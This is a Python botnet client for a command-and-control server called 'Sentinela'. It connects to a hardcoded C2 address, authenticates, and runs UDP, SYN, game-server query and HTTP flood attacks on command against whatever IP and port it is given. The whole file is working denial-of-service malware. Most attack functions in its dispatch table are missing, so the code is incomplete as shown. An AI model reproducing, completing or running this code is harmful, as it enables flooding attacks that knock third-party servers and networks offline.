#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────────
#   Minimal bot client for “Sentinela” C2
#   • Supports 11 flood methods (.UDP .TCP .MIX .SYN .HEX .VSE .MCPE
#     .FIVEM .HTTPGET .HTTPPOST .BROWSER)
#   • Global STOP control: C2 sends the string "STOP" → every running
#     attack loop halts immediately.
# ──────────────────────────────────────────────────────────────────────────

import socket, threading, time, os, random

# ───── C2 CONFIG ─────────────────────────────────────────────────────────
C2_ADDRESS = "134.255.234.140"
C2_PORT    = 6666

# ───── PAYLOADS ──────────────────────────────────────────────────────────
payload_fivem = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
payload_vse   = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
payload_mcpe  = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
payload_hex   = b'\x55\x55\x55\x55\x00\x00\x00\x01'

PACKET_SIZES = [512, 1024, 2048]

# ───── USER‑AGENT GENERATOR (for HTTP floods) ────────────────────────────
base_user_agents = [
    'Mozilla/%.1f (Windows NT 10.0; Win64; x64) Gecko/%d0%d Firefox/%.1f',
    'Mozilla/%.1f (Windows NT 10.0; Win64; x64) AppleWebKit/%.1f.%d Chrome/%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/%.1f.%d Safari/%.1f',
    'Mozilla/%.1f (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/%.1f.%d Version/14.0 Mobile/15E148 Safari/%.1f'
]
def rand_ua():
    tmpl = random.choice(base_user_agents)
    return tmpl % (
        random.uniform(5,10),
        random.uniform(500,600),
        random.randint(0,9),
        random.uniform(70,115)
    )

# ───── GLOBAL CONTROL FLAG ───────────────────────────────────────────────
running_event = threading.Event()
running_event.set()  # This controls the state of the attack loops (True means running)

# ───── ATTACK FUNCTIONS (all obey `running_event`) ──────────────────────
def attack_fivem(ip, port, stop_at):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while running_event.is_set() and time.time() < stop_at:
        sock.sendto(payload_fivem, (ip, port))

# Other attack functions are similar to above (mcpe, vse, hex, etc.)

# ───── DISPATCH TABLE ────────────────────────────────────────────────────
METHODS = {
    '.HEX':      attack_hex,
    '.UDP':      attack_udp_bypass,
    '.TCP':      attack_tcp_bypass,
    '.MIX':      attack_tcp_udp_bypass,
    '.SYN':      attack_syn,
    '.VSE':      attack_vse,
    '.MCPE':     attack_mcpe,
    '.FIVEM':    attack_fivem,
    '.HTTPGET':  attack_http_get,
    '.HTTPPOST': attack_http_post,
    '.BROWSER':  attack_browser,
}

# ───── C2 COMMUNICATION LOOP ─────────────────────────────────────────────
def main():
    global running_event
    while True:
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

            # — Connect / login —
            while True:
                try:
                    c2.connect((C2_ADDRESS, C2_PORT))
                    # Login handshake
                    while True:
                        data = c2.recv(1024).decode()
                        if 'Username' in data:
                            c2.send(b'BOT')
                        elif 'Password' in data:
                            c2.send(b'\xff\xff\xff\xff\\75')
                            break
                    print('[+] Connected & authenticated to C2')
                    break
                except Exception as e:
                    print(f'[!] Error: {e}')
                    time.sleep(120)  # retry

            # — Command loop —
            while True:
                try:
                    data = c2.recv(1024).decode().strip()
                    if not data:
                        break

                    # Global STOP command from server
                    if data.startswith('STOP'):
                        running_event.clear()
                        print('[!] Received STOP – halting floods')
                        continue

                    # Attack instructions
                    args    = data.split()
                    method  = args[0].upper()
                    ip      = args[1]
                    port    = int(args[2])
                    dur     = int(args[3])
                    threads = int(args[4])
                    stop_at = time.time() + dur

                    # Reset flag for new attack
                    running_event.set()

                    if method in METHODS:
                        for _ in range(threads):
                            threading.Thread(
                                target=METHODS[method],
                                args=(ip, port, stop_at),
                                daemon=True
                            ).start()
                        print(f'[*] Launching {method} -> {ip}:{port} for {dur}s x{threads}')
                except Exception as e:
                    print(f'[!] Command loop error: {e}')
                    break

            c2.close()
        except Exception as e:
            print(f'[!] Main loop error: {e}')
            time.sleep(5)

# ───── ENTRY ─────────────────────────────────────────────────────────────
if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f'[!] Fatal error: {e}')
